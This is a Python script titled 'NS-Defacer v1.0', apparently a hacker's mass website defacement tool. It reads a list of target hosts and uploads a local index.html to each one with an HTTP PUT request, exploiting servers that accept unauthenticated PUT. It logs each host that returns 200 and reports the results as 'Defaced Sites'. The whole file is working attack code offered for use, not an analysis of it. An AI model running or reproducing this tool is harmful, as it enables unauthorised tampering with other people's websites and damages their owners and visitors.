import requests
import sys
import os
import time
from colorama import Fore,Style

class colors:
    CRED2 = "\33[91m"
    CBLUE2 = "\33[94m"
    ENDC = "\033[0m"


banner = ("""
                                                                                                                

                █▀▀▄ █▀▀ ── █▀▀▄ █▀▀ █▀▀ █▀▀█ █▀▀ █▀▀ █▀▀█ 
                █──█ ▀▀█ ▀▀ █──█ █▀▀ █▀▀ █▄▄█ █── █▀▀ █▄▄▀ 
                ▀──▀ ▀▀▀ ── ▀▀▀─ ▀▀▀ ▀── ▀──▀ ▀▀▀ ▀▀▀ ▀─▀▀    v1.0 """)
                                                                                                                                                                                                                       
                                                                                                                                                                                                                       
for col in banner:
    print(colors.CRED2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0025)

x = ("""
                Author:  TheNightSec | NS-ROOT
                Github:  https://github.com/TheNightSec
                Website: https://NightSec.Tech \n """)
for col in x:
    print(colors.CBLUE2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0040)

y = "\n\t\tHi there, Shall we play a game..? 😃\n"
for col in y:
    print(colors.CRED2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0040)

z = "\n"
for col in z:
    print(colors.ENDC + col, end="")
    sys.stdout.flush()
    time.sleep(0.4)

def main():
	list= "list.txt"
	opened=open(list,"r")
	d= "index.html"
	data=open(d).read()
	d="/"+d
	for i in opened:
		try:
			i=i.strip()
			if 'http://' not in i:
				i='http://'+i
			req=requests.Session().put(i+d,data=data)
			if req.status_code==200:
				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
				f=open("ns-success.txt","a")
				f.write(i+d+"\n")
				f.close()
			else:
				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
		except  requests.exceptions.RequestException:
			continue

banner
main()
print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'All Defaced Sites are Saved in ns-success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
